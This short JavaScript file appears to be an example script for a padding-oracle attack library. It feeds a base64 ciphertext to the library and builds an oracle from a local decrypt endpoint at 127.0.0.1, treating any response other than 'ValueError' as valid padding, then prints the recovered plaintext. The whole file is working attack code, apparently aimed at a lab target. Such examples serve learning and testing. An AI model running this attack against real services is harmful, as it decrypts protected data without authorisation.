const oracle_pad = require("../");
const axios = require("axios");
const querystring = require("querystring");

oracle_pad(
	Buffer.from("4H9sSSacHO+8vaRXohMgY7iazFba37eZ9FdQRdSQCenLmEaUoXiWIKOqEjA1hl1yCPHNb+mlCnh3pmdB+8Ya2A==", "base64"),
	16,
	async (data) => {
		return (await axios.get(`http://127.0.0.1/secure/decrypt?e_data=${querystring.escape(data)}&sig=&token=`))
			.data.result.message !== "ValueError";
	},
	{
		//debug: true
	}
).then(decrypted => console.log(decrypted.toString('utf8')));
